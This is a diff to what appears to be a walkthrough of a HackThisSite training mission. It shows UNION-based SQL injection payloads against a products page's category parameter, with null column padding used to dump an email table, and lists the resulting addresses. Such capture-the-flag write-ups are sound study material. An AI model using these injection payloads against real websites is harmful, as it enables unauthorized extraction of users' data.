@@ -9,3 +9,22 @@ like so:
 https://www.hackthissite.org/missions/realistic/4/products.php?category=2%20union%20select%20*%20from%20products
 leads to a website that displays all products. So we are on the right track.
 
+By using UNION ALL we can output another table - the only catch: the number of colums need to match. So we just try
+UNION ALL SELECT * FROM email
+adding ',null' after '*' until we get a valid output. This happens for
+UNION ALL SELECT *,null,null,null FROM email
+We do not get any information yet, the reason being that the correct column does not get displayed. By moving the columns around
+UNION ALL SELECT null,*,null,null FROM email
+we get the addresses displayed as the product description text:
+ 	 	alph-alpha-brown@hotmail.com
+	 	sam.goodwin@yahoo.com
+    UltraDeathLaser@aol.com
+	 	SwingLow@hotmail.com
+	 	TeaBody@aol.com
+	 	jsmith@uic.edu 
+	 	3ambeer@graffiti.net
+	 	shootfirst@yahoo.com
+	 	Bobby@friends.com
+    
+To complete the mission, a message with these addresses was sent to SaveTheWhales:
+https://www.hackthissite.org/pages/messages/msys/send.php?id=SaveTheWhales&action=send
